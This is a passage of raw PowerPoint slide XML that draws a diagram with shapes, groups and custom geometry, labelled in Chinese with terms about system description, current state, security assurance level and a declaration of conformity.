                <a:gd name="adj1" fmla="val -55463"/>
                <a:gd name="adj2" fmla="val 75199"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="EAEAEA"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:schemeClr val="bg2"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800" b="1">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="50" name="Group 143"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="6319266" y="5035960"/>
              <a:ext cx="319088" cy="147638"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="201" cy="93"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="56" name="Oval 144"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="24" y="0"/>
                <a:ext cx="177" cy="81"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="57" name="Oval 145"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="12" y="6"/>
                <a:ext cx="177" cy="81"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="58" name="Oval 146"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="12"/>
                <a:ext cx="177" cy="81"/>
              </a:xfrm>
              <a:prstGeom prst="ellipse">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" anchor="ctr"/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="51" name="Rectangle 147"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5887466" y="5180423"/>
              <a:ext cx="946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5000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>符合性声明</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="52" name="Text Box 148"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1926655" y="4854985"/>
              <a:ext cx="1606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r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                  <a:solidFill>
                    <a:schemeClr val="tx2"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>系统安全保障级别</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="组合 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4397624" y="1336528"/>
            <a:ext cx="1949475" cy="557770"/>
            <a:chOff x="4397624" y="1336528"/>
            <a:chExt cx="1949475" cy="557770"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="44" name="Line 112"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5473129" y="1641885"/>
              <a:ext cx="0" cy="25241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未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="208345">
              <a:off x="4397624" y="1336528"/>
              <a:ext cx="1949475" cy="310829"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T1" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T2" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T3" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T4" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T5" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T7" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T8" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T9" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T10" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T11" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T12" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T13" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T14" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T15" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T16" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T17" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T18" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T19" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T20" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T21" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T22" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T23" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T24" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T25" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T26" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T27" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T28" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T29" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T30" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T31" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T32" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T33" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T34" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T35" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T36" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T37" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T38" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T39" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T40" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T41" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T42" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T43" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T44" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T45" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T46" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T47" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T48" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T49" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T50" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T51" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T52" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T53" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T54" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T55" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T56" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T57" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T58" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T59" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T60" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T61" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T62" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T63" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T64" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T65" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T66" fmla="*/ 0 w 432"/>
                <a:gd name="T67" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T68" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T69" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T70" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T71" fmla="*/ 2147483647 h 42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32"/>
                <a:gd name="T109" fmla="*/ 0 h 425"/>
                <a:gd name="T110" fmla="*/ 432 w 432"/>
                <a:gd name="T111" fmla="*/ 425 h 42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32" h="425">
                  <a:moveTo>
                    <a:pt x="61" y="333"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="65" y="354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="86" y="384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102" y="390"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117" y="391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="386"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="146" y="405"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163" y="418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="180" y="425"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="202" y="425"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="236" y="407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250" y="388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="376"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="265" y="386"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="301" y="393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="323" y="388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="342" y="373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="357" y="354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="373" y="354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="390" y="346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="401" y="333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411" y="316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="409" y="293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="403" y="270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="392" y="250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="378" y="233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="397" y="208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="417" y="182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="432" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="430" y="125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="422" y="100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="396" y="59"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="374" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="365" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="309" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="290" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="252" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="57"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169" y="66"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="92" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="176"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="197"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="218"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="61" y="333"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="DDDDDD"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:schemeClr val="folHlink"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="54" name="Rectangle 150"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4752404" y="1430748"/>
              <a:ext cx="1223962" cy="19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0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="80000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>系统</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>描述</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="宋体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="组合 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4230117" y="711610"/>
            <a:ext cx="1530349" cy="684213"/>
            <a:chOff x="4230117" y="711610"/>
            <a:chExt cx="1530349" cy="684213"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="25" name="Rectangle 67"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4230117" y="898935"/>
              <a:ext cx="838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r" eaLnBrk="0" hangingPunct="0"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>系统现状</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="45" name="Group 113"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="5154041" y="711610"/>
              <a:ext cx="606425" cy="449263"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="382" cy="283"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="71" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="134" y="58"/>
                <a:ext cx="114" cy="79"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 172"/>
                  <a:gd name="T1" fmla="*/ 1 h 119"/>
                  <a:gd name="T2" fmla="*/ 1 w 172"/>
                  <a:gd name="T3" fmla="*/ 1 h 119"/>
                  <a:gd name="T4" fmla="*/ 1 w 172"/>
                  <a:gd name="T5" fmla="*/ 1 h 119"/>
                  <a:gd name="T6" fmla="*/ 1 w 172"/>
                  <a:gd name="T7" fmla="*/ 0 h 119"/>
                  <a:gd name="T8" fmla="*/ 1 w 172"/>
                  <a:gd name="T9" fmla="*/ 0 h 119"/>
                  <a:gd name="T10" fmla="*/ 0 w 172"/>
                  <a:gd name="T11" fmla="*/ 1 h 119"/>
                  <a:gd name="T12" fmla="*/ 1 w 172"/>
                  <a:gd name="T13" fmla="*/ 1 h 119"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 172"/>
                  <a:gd name="T22" fmla="*/ 0 h 119"/>
                  <a:gd name="T23" fmla="*/ 172 w 172"/>
                  <a:gd name="T24" fmla="*/ 119 h 1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2" h="119">
                    <a:moveTo>
                      <a:pt x="5" y="119"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="165" y="119"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="172" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="119"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:schemeClr val="folHlink"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="72" name="Rectangle 115"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="0" y="137"/>
                <a:ext cx="382" cy="146"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="9966FF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="73" name="Line 116"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="162" y="102"/>
                <a:ext cx="0" cy="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17"/>
              <p:cNvSpPr>
                <a:spLocks noChangeShapeType="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="219" y="102"/>
                <a:ext cx="0" cy="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未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="143" y="168"/>
                <a:ext cx="95" cy="88"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1 w 144"/>
                  <a:gd name="T1" fmla="*/ 1 h 134"/>
                  <a:gd name="T2" fmla="*/ 1 w 144"/>
                  <a:gd name="T3" fmla="*/ 1 h 134"/>
                  <a:gd name="T4" fmla="*/ 1 w 144"/>
                  <a:gd name="T5" fmla="*/ 1 h 134"/>
                  <a:gd name="T6" fmla="*/ 1 w 144"/>
                  <a:gd name="T7" fmla="*/ 1 h 134"/>
                  <a:gd name="T8" fmla="*/ 1 w 144"/>
                  <a:gd name="T9" fmla="*/ 1 h 134"/>
                  <a:gd name="T10" fmla="*/ 1 w 144"/>
                  <a:gd name="T11" fmla="*/ 1 h 134"/>
                  <a:gd name="T12" fmla="*/ 1 w 144"/>
                  <a:gd name="T13" fmla="*/ 1 h 134"/>
                  <a:gd name="T14" fmla="*/ 1 w 144"/>
                  <a:gd name="T15" fmla="*/ 0 h 134"/>
                  <a:gd name="T16" fmla="*/ 1 w 144"/>
                  <a:gd name="T17" fmla="*/ 0 h 134"/>
                  <a:gd name="T18" fmla="*/ 1 w 144"/>
                  <a:gd name="T19" fmla="*/ 1 h 134"/>
                  <a:gd name="T20" fmla="*/ 1 w 144"/>
                  <a:gd name="T21" fmla="*/ 1 h 134"/>
                  <a:gd name="T22" fmla="*/ 0 w 144"/>
                  <a:gd name="T23" fmla="*/ 1 h 134"/>
                  <a:gd name="T24" fmla="*/ 0 w 144"/>
                  <a:gd name="T25" fmla="*/ 1 h 134"/>
                  <a:gd name="T26" fmla="*/ 1 w 144"/>
                  <a:gd name="T27" fmla="*/ 1 h 134"/>
                  <a:gd name="T28" fmla="*/ 1 w 144"/>
                  <a:gd name="T29" fmla="*/ 1 h 134"/>
                  <a:gd name="T30" fmla="*/ 1 w 144"/>
                  <a:gd name="T31" fmla="*/ 1 h 134"/>
                  <a:gd name="T32" fmla="*/ 1 w 144"/>
                  <a:gd name="T33" fmla="*/ 1 h 1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4"/>
                  <a:gd name="T52" fmla="*/ 0 h 134"/>
                  <a:gd name="T53" fmla="*/ 144 w 144"/>
                  <a:gd name="T54" fmla="*/ 134 h 1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4" h="134">
                    <a:moveTo>
                      <a:pt x="131" y="134"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="136" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
